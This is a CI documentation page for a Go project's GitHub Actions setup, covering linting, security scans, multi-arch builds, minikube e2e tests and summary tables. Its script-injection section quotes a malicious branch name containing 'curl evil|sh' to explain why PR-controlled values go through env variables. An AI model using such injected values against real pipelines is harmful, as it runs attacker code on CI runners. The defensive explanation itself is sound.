# CI

## Workflow split

CI is split by what changed:

| Workflow | Runs on changes to | Jobs |
|---|---|---|
| [`app-ci.yml`](../.github/workflows/app-ci.yml) | `src/**`, `helm/**` | [Go lint](#go-lint), [SAST + SCA](#sast-and-sca) and [image scan](#image-scan) via [reusable scans](#reusable-scans), [multi-arch build](#build) (GHCR push, [cache](#build-cache)), [e2e](#e2e-tests) (incl. [binary](#binary-e2e), [minikube](#minikube-e2e)), secret scan, [summary](#build-summary) |
| [`helm-ci.yml`](../.github/workflows/helm-ci.yml) | `helm/**` | [Chart lint](#chart-lint) + [trivy config](#trivy-config), [summary](#build-summary) |
| [`github-ci.yml`](../.github/workflows/github-ci.yml) | `.github/**` | [actionlint, ruff, pytest at 100% coverage](#github-ci), [summary](#build-summary) |
| [`docs-ci.yml`](../.github/workflows/docs-ci.yml) | every change (no path filter) | [doc links](#doc-links), [summary](#build-summary) |

Both also run when their own workflow file or `.github/actions/**` changes, so a CI edit tests itself. App CI also runs on chart changes, because the minikube e2e deploys the in-repo chart. An app-only PR doesn't lint the chart.

Gotcha: a path-filtered workflow that doesn't run leaves its checks pending. If either workflow becomes a required status check, add an always-running gate job, or the filtered PRs can never merge.

## Gather metadata

Every workflow starts with a `metadata` job that checks out the repo and runs [`.github/actions/gather-metadata`](../.github/actions/gather-metadata/action.yml). Downstream jobs read branch, SHA, commit message and trigger reason from its outputs instead of re-deriving them.

| Output | Value |
|---|---|
| `branch` | PR head branch on `pull_request`, branch name on branch pushes, empty on tag pushes |
| `sha` / `short-sha` | Commit being built (see [PR head commit](#pr-head-commit)) |
| `commit-message` | Subject line of that commit (see [Commit message](#commit-message)) |
| `reason` | `github.event_name` |

### Script injection

Values controlled by whoever opens a PR or pushes (`head_ref`, commit messages) are passed to `run:` through `env:` and read as `"$VAR"`. They are never put inline as `${{ ... }}`.

With inline `${{ }}`, Actions substitutes the text into the script before bash runs, so a branch named `` a`curl evil|sh` `` would execute. An environment variable is only data to bash. See GitHub's [security hardening guide](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections).

### PR head commit

On `pull_request`, `github.sha` is a temporary merge commit (PR merged into base) that GitHub creates for the run. Nobody pushed it, it isn't on any branch, and a short SHA built from it matches nothing in the PR. The action reports `github.event.pull_request.head.sha` instead, which is the commit the author pushed.

### Commit message

The commit subject comes from `git log` in the checked-out repo, not from the GitHub API. This needs no token or network, and it works under [act](LOCAL-TESTING.md#ci), whose runner image has no `gh` CLI.

On `pull_request`, `actions/checkout` fetches only the merge commit (`fetch-depth: 1`), so the PR head commit is not present locally. In that case the action fetches that one commit (`git fetch --depth=1 origin <sha>`) and then reads it.

## Go lint

Five Go checks run on `src/`, each as its own step and [summary](#build-summary) row, all with the `e2e` build tag so the e2e tests are covered too. The `lint` job runs the three `tests` checks. gosec and govulncheck run in the reusable [`scan-source`](#reusable-scans) workflow, so release runs exactly the same ones:

| Step | Kind | Catches |
|---|---|---|
| `golangci-lint (hygiene)` | tests | `errcheck`, `ineffassign`, `unused`, `errorlint` (`%w` wrapping), `bodyclose`, `misspell`, `gofmt`, configured in [`src/.golangci.yml`](../src/.golangci.yml) |
| `go vet (correctness)` | tests | Suspicious constructs the compiler accepts (printf args, struct tags, copied locks) |
| `staticcheck (correctness)` | tests | Bugs, dead code, deprecated APIs, simplifications |
| `gosec (SAST)` | security | See [SAST and SCA](#sast-and-sca) |
| `govulncheck (SCA)` | security | See [SAST and SCA](#sast-and-sca) |

golangci-lint is limited to hygiene linters (`default: none`). vet, staticcheck and gosec run standalone, so each tool reports once under its own name instead of twice. All versions are pinned (see [Tool pins](#tool-pins)). To run locally, see [LOCAL-TESTING.md#ci](LOCAL-TESTING.md#ci).

## SAST and SCA

- **gosec** (SAST) scans our own Go code for security flaws: path traversal, unchecked errors, missing HTTP server timeouts, log injection.
- **govulncheck** (SCA) checks the module's dependencies and the Go stdlib against the Go vulnerability database. It reports only vulnerabilities whose vulnerable symbols our code actually calls, which removes the false positives a version-only scanner reports.

Both run on source. The built image is scanned separately (see [Image scan](#image-scan)).

staticcheck and gosec ship checksum-verified release binaries. govulncheck doesn't, so it's built with `go install`. Both upstream modules require Go ≥ 1.26, so `GOTOOLCHAIN=auto` fetches a newer toolchain for that build only. The analysis itself uses the module's Go 1.24 toolchain, so stdlib findings match what we ship.

## Tool pins

Every CI tool version lives in one block in [`.github/actions/install-ci-tools`](../.github/actions/install-ci-tools/action.yml):

| Suite | Installs |
|---|---|
| `app` | Go, golangci-lint, staticcheck, gosec, govulncheck |
| `helm` | helm, kubeconform, kube-linter, trivy |
| `minikube` | Go, helm, minikube, kubectl |
| `scan` | trivy + `trivy-plugin-govulncheck` |
| `github` | uv (then `uv sync --locked` in `.github/`), actionlint |

An unknown suite fails fast. Binaries, including golangci-lint and helm, are fetched from upstream releases and checked against the published SHA-256 checksums, rather than through their setup actions, so they can be [cached](#tool-cache). One `k8s-version` pin (1.37.0, the newest that kubeconform schemas, minikube v1.39.0 and kubectl all support) drives kubeconform's schemas, the minikube cluster and kubectl, so they always agree. To bump a tool, change one line there.

Exceptions: the Go version comes from `src/go.mod`, so the toolchain matches the module. Python and its dev tools come from `.github/.python-version`, `pyproject.toml` and `uv.lock` (see [GitHub CI](#github-ci)). Actions are pinned by major tag where they're used (`astral-sh/setup-uv` by exact tag, since it publishes no major tags).

Every pin carries a `# latest: <release page> (checked YYYY-MM-DD)` comment, so it's clear when it was last compared to upstream. The pins block strips these comments before writing `$GITHUB_OUTPUT`. All pins were on their latest release as of 2026-10-21, except `k8s-version` (see above) and the Go 1.24 toolchain, which comes from the original `go.mod`.

### Tool cache

`install-ci-tools` uses `actions/cache` (v6) wherever a download repeats across runs:

| Cache | Path | Key | Saves |
|---|---|---|---|
| Tools | `~/.cache/ci-tools/<suite>` | suite, OS, arch, hash of the pins block | Every downloaded binary, plus the trivy plugin tarball. On a hit, all download steps are skipped. Bumping any pin changes the hash, so the cache never serves stale versions |
| Go | setup-go's module + build cache | Go version + `src/go.mod` | Compiled packages for `go test`/vet, and the `go install` of govulncheck (including the newer toolchain it needs) |
| minikube | `~/.minikube/cache` | arch, minikube version, `k8s-version` | Preload tarball + kicbase image (~1 GB) that `minikube start` would download |
| trivy | `~/.cache/trivy` | OS + UTC date (restore from any older day) | Vulnerability DB and misconfig checks bundle. Trivy still refreshes them when stale |
| kubeconform | `~/.cache/kubeconform` | `k8s-version` + hash of `helm/**` | Core and CRD-catalog JSON schemas (`-cache` flag) |
| uv | setup-uv's cache | `.github/uv.lock` | Python wheels and the interpreter |

Each cache is saved only when its key missed, so a hit costs a restore and no upload. Cache scope follows GitHub's rules: a PR branch can read caches from `main`, but not from other branches.

## Build

`build` is a single job: one `docker buildx build --platform linux/amd64,linux/arm64` of [`src/Dockerfile`](../src/Dockerfile), pushed to GHCR as the multi-arch `<image>:<sha>` (see [Image tags](#image-tags)), using the [registry cache](#build-cache). The Dockerfile cross-compiles Go on the build platform, and its busybox stage also runs on the build platform (see [CONTAINER.md#cross-compile](CONTAINER.md#cross-compile)). So no build step executes target-arch code, and one amd64 runner builds both arches without QEMU.

After the push, the same job:

- Copies each arch's binary out of the pushed index with [`extract-binary.sh`](../.github/scripts/extract-binary.sh), fails unless it's static, and uploads both as artifact `binaries` (`amd64/`, `arm64/`). See [Binary e2e](#binary-e2e).

Target-arch execution (e2e, minikube) happens later, in `e2e-tests` on native runners per arch.

### Image tags

Every CI run pushes to `ghcr.io/<owner>/<repo>` (lowercased by [`gather-metadata`](../.github/actions/gather-metadata/action.yml), here `ghcr.io/yoyobesser/echo-pong`):

| Tag | What |
|---|---|
| `<sha>` | OCI index (amd64 + arm64) for the full commit SHA, which is the PR head commit on PRs (see [PR head commit](#pr-head-commit)) |
| `<branch-slug>-cache` | [Build cache](#build-cache) |

`branch-slug` is the branch lowercased, with runs of characters outside `[a-z0-9._-]` replaced by `-`, so `feat/yonatan.besser/home-assignment-init` becomes `feat-yonatan.besser-home-assignment-init`. Provenance attestations are off for CI images (`provenance: false`). Signing and SBOMs belong to the release workflow.

Pushing needs `packages: write`, granted only to `build`. `e2e-tests` gets `packages: read`. PRs from forks get a read-only `GITHUB_TOKEN`, so they can't push. This repo's PRs come from branches in the same repo. Per-commit tags pile up, so they need a retention policy (README L94, see [TASKS.md](TASKS.md)).

The registry is overridable: workflows pass `vars.CI_IMAGE` to `gather-metadata`, which outputs `image` and its `registry` host for `docker/login-action`. It's unset on GitHub. Locally, [act.sh](LOCAL-TESTING.md#act-wrapper) points it at a local registry.

### Build cache

The build reads and writes a BuildKit registry cache in GHCR. Because both platforms come from one build, one cache ref holds both:

- `cache-to`: `<branch-slug>-cache`, with `mode=max` (cache every stage, including the Go build stage), `image-manifest=true,oci-mediatypes=true` (the cache stored as a regular OCI image, which GHCR accepts) and `ignore-error=true` (a cache export failure never fails the build).
- `cache-from`: the branch's own cache first, then `main-cache`, so a new branch's first build starts warm from main. A missing ref is only a warning.

## E2E tests

[`src/test/e2e`](../src/test/e2e) black-box tests the image. It never imports app code. It only runs the container via the docker CLI and checks exit codes, output and HTTP responses. The `e2e` build tag keeps it out of plain `go test ./...`.

The target is set by env. `E2E_IMAGE` makes the tests start containers themselves. `E2E_BASE_URL` (plus `E2E_SECRET`) points `TestAPI` at an already-running server, and `TestCLI` skips. The same API cases therefore run against a bare container and a [live deploy](#minikube-e2e).

| Suite | Test | Covers |
|---|---|---|
| CLI | `TestCLI` | `--help`, ping/pong, wrong/missing password, missing/unknown command, missing `SECRET_FILE_PATH` |
| API | `TestAPI` | `/health`, `/`, `/ping` and `/pong` with no, wrong, raw and `Bearer` tokens |

The `e2e-tests` job runs once per arch on a native runner (`fail-fast: false`). It pulls the multi-arch `<image>:<sha>` from GHCR and fails unless the runner resolved its own arch, which also checks the index. It downloads the `binaries` artifact (using `dist/<arch>/`), then runs the suites in sequence, fastest first, so a broken image fails within seconds:

- `CLI e2e`: `go test -run '^TestCLI$'` against containers.
- `API e2e`: `go test -run '^TestAPI$'` against a container.
- `binary e2e (ubuntu, alpine)`: both suites against the static binary on stock distros (see [Binary e2e](#binary-e2e)).
- `minikube e2e`: `TestAPI` through the Gateway of a live deploy (see [Minikube e2e](#minikube-e2e)).

The first failing suite fails the job, and later suites are skipped.

The suites are deliberately not [`parallel:`](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idstepsparallel) steps. actionlint 1.7.12 (latest as of 2026-10) and act 0.2.89 don't support the keyword, so parallel steps couldn't be linted or run locally. Revisit when both support it.

The secret file goes in with `docker create` + `docker cp`, not a bind mount (see [LOCAL-TESTING.md#e2e](LOCAL-TESTING.md#e2e)). The API suite waits up to 45s for `/health`, because the server sleeps 10s before listening.

## Chart lint

`helm-ci.yml` checks [`helm/echo-pong`](../helm/echo-pong) in three layers:

0. `helm dependency build` fetches the [Envoy Gateway subchart](HELM.md#envoy-gateway) pinned in `Chart.lock`. `helm/*/charts/` is gitignored.
1. `helm lint --strict`: chart structure and templates. Warnings fail too.
2. `helm template --skip-tests` renders the manifests. Test hooks are skipped because they are throwaway pods, not deployed workload, and would otherwise trip the policy below.
3. The rendered output goes through [kubeconform](#kubeconform) (schema), [kube-linter](#kube-linter-policy) (policy) and [trivy config](#trivy-config) (security misconfig).

### Kubeconform

`kubeconform -strict` validates every rendered object against the Kubernetes OpenAPI schema for the pinned `k8s-version` (see [Tool pins](#tool-pins)). `-strict` rejects unknown fields, so a typo like `readinesProbe` fails instead of being silently dropped. Bump `k8s-version` to match the target cluster's minor version.

CRDs (Gateway API `Gateway`/`HTTPRoute`/`GatewayClass`, Envoy `EnvoyProxy`) aren't in the core schema. A second `-schema-location` points at the [Datree CRDs catalog](https://github.com/datreeio/CRDs-catalog), so they're validated instead of erroring with "could not find schema".

### Kube-linter policy

[`helm/.kube-linter.yaml`](../helm/.kube-linter.yaml) sets `doNotAutoAddDefaults: true` and lists every check explicitly. Each line carries a comment naming the README requirement it enforces, so the policy is the README's requirements made executable, and nothing more.

Two custom checks set the replica floor to 2 (`minimum-two-replicas`, `hpa-minimum-two-replicas`) instead of the built-in 3. Two replicas plus a PDB keep a pod serving through a rolling update or a single node drain. README L59 (registry pull) has no static check. It's covered by deploying, not linting.

## Soft-fail

Temporary: every check step that fails on the exercise's original code or the basic chart runs with step-level `continue-on-error: true`:

- `app-ci.yml`: golangci-lint, `go vet`, staticcheck, plus the [reusable scans](#reusable-scans) called with `blocking: false` (gosec, govulncheck, trivy image). Release calls the same scans with `blocking: true`.
- `helm-ci.yml`: helm lint, template, kubeconform, kube-linter. `trivy config` is **blocking**: the chart passes its README gate since it gained a securityContext ([HELM.md#security-context](HELM.md#security-context)).

This PR only adds the skeleton. It fixes nothing in the original `main.go`/`go.mod` (11 lint issues, 22 HIGH Go stdlib CVEs from Go 1.24) and doesn't harden the chart. Fixes come in later PRs, with CI as the guardrail.

Step-level (not job-level) keeps the job green so downstream jobs run, while the failure still shows in the step log and as `⚠️ fail (non-blocking)` in the [summary tables](#build-summary).

To make these checks blocking, remove every `continue-on-error` (`grep -rn continue-on-error .github`) and the TODO comments that link here.

## Minikube e2e

The `minikube e2e` step runs last in each arch's [`e2e-tests` job](#e2e-tests), after the container and binary suites pass. It runs `TestAPI` against a live Kubernetes deploy, with traffic entering through the [Gateway](HELM.md#envoy-gateway) the way it would in production.

[`src/test/e2e/minikube-e2e.sh`](../src/test/e2e/minikube-e2e.sh) does the whole flow, locally and in CI:

1. `minikube start` (docker driver, `k8s-version` from [Tool pins](#tool-pins)), then `minikube image load` the CI image.
2. `helm dependency build` the in-repo chart (`CHART_REF` overrides it, e.g. with a released OCI chart).
3. Create the namespace and the [auth Secret](HELM.md#auth-secret) holding a random token. On a kept cluster, the existing token is reused, because the app reads its secret only at startup.
4. `helm upgrade --install --wait` with the CI image and `image.pullPolicy=Never`.
5. Wait for the Gateway to be `Programmed` and the Envoy proxy pods to be ready. The controller creates them after install, so `helm --wait` doesn't cover them.
6. `kubectl port-forward` the Envoy proxy Service, then run `TestAPI` with `E2E_BASE_URL` and `E2E_SECRET`.
7. Delete the cluster on exit (unless `KEEP_CLUSTER=1`).

## Binary e2e

The release binary is the one inside the image, not a separate build. For each arch, `build` runs [`extract-binary.sh`](../.github/scripts/extract-binary.sh): `docker create --platform linux/<arch>` on the pushed index, then `docker cp` of `/usr/local/bin/ping-pong-app`. It fails unless `file` reports `statically linked`. Both binaries are uploaded as artifact `binaries`. The container and the binary release can't drift: they are the same bytes.

The binary is static because the Dockerfile builds with `CGO_ENABLED=0` (see [CONTAINER.md#cross-compile](CONTAINER.md#cross-compile)). With no libc dependency, it runs on any Linux distribution of its arch.

The `binary e2e (ubuntu, alpine)` step in each arch's [`e2e-tests` job](#e2e-tests) checks that on stock distros: `ubuntu:latest` for glibc and `alpine:latest` for musl, on the arch's native runner. For each OS, it copies the binary into a bare distro image with [`src/test/e2e/binary.Dockerfile`](../src/test/e2e/binary.Dockerfile) and runs the same CLI and API suites against it (one log group per OS). Nothing from the app image is reused except the binary.

Artifacts don't keep file modes, so the step runs `chmod +x` first. darwin binaries can't come from a Linux image. They'll be cross-compiled in the release workflow.

## Reusable scans

Security scans are defined once, as reusable workflows (`on: workflow_call`), and called by both CI and release:

| Workflow | Jobs | Checks |
|---|---|---|
| [`scan-source.yml`](../.github/workflows/scan-source.yml) | `scan-source` | gosec (SAST), govulncheck (SCA). See [SAST and SCA](#sast-and-sca) |
| [`scan-image.yml`](../.github/workflows/scan-image.yml) | `scan-image (amd64)`, `scan-image (arm64)` | trivy vuln + image misconfig, govulncheck-filtered. See [Image scan](#image-scan) |

Both take a `blocking` input. With `true`, a finding fails the job. With `false`, the step runs under `continue-on-error`, so the finding shows as `⚠️` in the [summary](#build-summary) but nothing fails.

- `app-ci.yml` calls them with `blocking: false` until the original code is fixed (see [Soft-fail](#soft-fail)).
- `release.yml` calls them with `blocking: true` as the release gate (README L51, L87). `publish`, the only job that would tag `vX.Y.Z`, `needs:` both scans. A finding means no version tag, so nothing is released. `scan-image` scans the same `<image>:<sha>` digest that `publish` will retag, so what's released is exactly what was scanned.

Results recorded inside a called workflow land in the caller's run, so the caller's `summary` job picks them up like any other job.

## Image scan

The reusable [`scan-image`](#reusable-scans) workflow scans each arch of the pushed index (one matrix leg per arch, [`trivy-image.sh`](../.github/scripts/trivy-image.sh), `trivy image --platform linux/<arch>`) for CRITICAL/HIGH vulnerabilities (OS packages and the Go binary) and image-config misconfigurations (`--image-config-scanners misconfig`, e.g. running as root). It fails on any CRITICAL/HIGH finding, fixed upstream or not, because README L51 forbids shipping them.

Go-binary findings go through [`trivy-plugin-govulncheck`](https://github.com/DataDog/trivy-plugin-govulncheck) (v0.1.4). It runs govulncheck in binary mode on the image's Go binary, and drops (marks `not_affected`) the CVEs whose vulnerable code isn't reachable. The filtered JSON is then gated with `trivy convert --exit-code 1`, because the exit code of an output-plugin run doesn't reflect findings.

The plugin pulls the image itself (go-containerregistry, not trivy's cache or the Docker daemon), so the scan targets the pushed `<image>:<sha>` in GHCR. Unverified: which platform of the index the plugin extracts. The stdlib findings are the same on both arches, since it's one Go build. It authenticates with the credentials `docker/login-action` wrote. A tag that exists only in the local daemon makes the plugin fall back to Docker Hub and silently skip filtering.

Both trivy and the plugin are installed from checksum-verified release tarballs rather than `aquasecurity/trivy-action`, so no third-party action code runs in the job. The plugin is installed from its tarball, not `trivy plugin install github.com/...`, which would fetch an unpinned manifest.

Blind spot: busybox is copied in as a bare binary, with no package metadata, so trivy doesn't see its version (see [CONTAINER.md#busybox](CONTAINER.md#busybox)).

## Trivy config

kube-linter only flags fields that are present and wrong. A container with no `securityContext` at all passes `privilege-escalation-container` and a drop-`ALL` capabilities check. Trivy's Kubernetes checks (KSV) also require the safe values to be set explicitly, so `helm-ci.yml` runs `trivy config` on the rendered chart as well:

1. The full report prints as a table. It's informational, and includes the Envoy Gateway subchart's RBAC.
2. The gate fails only on the KSV IDs listed in [`helm/.trivy-ksv-gate`](../helm/.trivy-ksv-gate). Each has a comment naming the README line it answers, like the [kube-linter policy](#kube-linter-policy):

| ID | Requires | README |
|---|---|---|
| KSV-0001 | `allowPrivilegeEscalation: false` | L49 |
| KSV-0012 | `runAsNonRoot: true` | L49 |
| KSV-0014 | `readOnlyRootFilesystem: true` | L53 |
| KSV-0003 | `capabilities.drop: [ALL]` | L83 |

## Build summary

Every workflow's run summary ends with a **Tests** table and a **Security** table. Rows are checks, columns are scopes (`all`, `amd64`, `arm64`). Together they show every test and security tool's result for the run in one place.

- Each job records its check outcomes with [`record-results`](../.github/actions/record-results/action.yml) (`if: always()`, one `kind|check|outcome|conclusion` row per check), uploaded as a `ci-results-<job>-<scope>` artifact.
- A final `summary` job (`needs:` all jobs, `if: always()`) downloads them and renders the tables with [`summarize-results`](../.github/actions/summarize-results/action.yml).

Outcomes come from `steps.<id>.outcome` and `.conclusion` inside the job. The GitHub API can't be used instead: it reports a failed `continue-on-error` step as `success`, which would hide every [soft-fail](#soft-fail). Naming and kind rules live in [.github/workflows/AGENTS.md](../.github/workflows/AGENTS.md).

## GitHub CI

`github-ci.yml` is CI for CI. It runs on any `.github/**` change:

- `lint` job: `actionlint (workflows)` (actionlint also runs shellcheck on `run:` blocks), `ruff check (lint)` and `ruff format (style)`.
- `test` job: `pytest (100% coverage)`.

The Python under `.github/` ([`summarize-results/render.py`](../.github/actions/summarize-results/render.py), [`scripts/check_doc_links.py`](../.github/scripts/check_doc_links.py)) is a uv project in [`.github/pyproject.toml`](../.github/pyproject.toml):

- Python version: [`.github/.python-version`](../.github/.python-version) (`3.14`), the newest Python cached on the `ubuntu-24.04` runner image (3.14.8). uv reads it and selects (or fetches) a matching interpreter, so no `setup-python` is needed.
- Dev tools: ruff, pytest and pytest-cov, pinned in the `dev` dependency group and locked in [`.github/uv.lock`](../.github/uv.lock). CI runs `uv sync --locked`, so a stale lock fails instead of resolving silently.
- Coverage: `--cov-branch --cov-fail-under=100` in `pyproject.toml`. Line and branch coverage both have to reach 100%. Only the `if __name__ == "__main__"` guard is excluded.

To run locally, see [LOCAL-TESTING.md#github-ci](LOCAL-TESTING.md#github-ci).

### Doc links

[`check_doc_links.py`](../.github/scripts/check_doc_links.py) enforces the [AGENTS.md](../AGENTS.md) comment rule on every tracked file (`git ls-files`). It runs in `docs-ci.yml` on every PR commit and every push to main, with no path filter, because doc links live in workflows, Dockerfiles, Go, shell and Helm files alike:

- **Code and config** (anything not `.md`): every `<path>.md#<anchor>` must be relative to the repo root (`docs/CI.md#soft-fail`, never `../docs/...` or `./...`), the file must exist, and the anchor must match a heading in it.
- **Markdown**: every `[text](path#anchor)` link is resolved relative to the linking file, the way GitHub renders it, and the anchor must match a heading. `README.md?plain=1#L49` line links must point at a line that exists. External URLs are skipped.

Links inside `inline code` are text, not links, so they're skipped. So are `test_*.py` files, which hold deliberately broken links as fixtures. Anchors are computed like GitHub's: lowercase, punctuation other than `-`/`_` dropped, spaces become `-`, `-1`, `-2`, ... for duplicate headings, and headings inside fenced code are ignored. Renaming a heading without updating its links fails CI. Run it locally with `uv run --project .github python .github/scripts/check_doc_links.py`.
